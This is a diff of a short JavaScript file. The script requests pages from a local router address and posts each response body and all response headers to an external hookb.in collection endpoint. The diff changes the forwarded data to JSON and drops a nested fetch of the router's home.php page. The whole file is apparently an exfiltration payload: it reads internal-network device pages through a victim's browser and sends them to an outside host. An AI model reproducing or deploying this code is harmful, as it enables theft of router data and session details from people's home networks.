@@ -1,15 +1,16 @@
 const ROUTER = "http://router.local";
 const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 
-function forwardResponse(res) {
+function forwardResponse(req) {
 	let fwdxhr = new XMLHttpRequest();
 	fwdxhr.open("POST", ENDPOINT, true);
-	fwdxhr.setRequestHeader("Content-Type", "text/html");
+	fwdxhr.setRequestHeader("Content-Type", "application/json");
 	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
-	/*const data = JSON.stringify({
-		"data": res,
-	});*/
-	fwdxhr.send(res);
+	const data = JSON.stringify({
+		"body": req.response,
+		"headers": req.getAllResponseHeaders(),
+	});
+	fwdxhr.send(data);
 }
 
 //forwardResponse("foo");
@@ -18,16 +19,7 @@ let xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
 	if (xhr.readyState === 4) {
-		//forwardResponse(xhr.response);
-
-		let xhr2 = new XMLHttpRequest();
-		xhr2.onreadystatechange = function() {
-			if (xhr2.readyState === 4) {
-				forwardResponse(xhr2.response);
-			}
-		}
-		xhr2.open("GET", ROUTER + "/home.php", true);
-		xhr2.send('');
+		forwardResponse(xhr);
 	}
 }
 
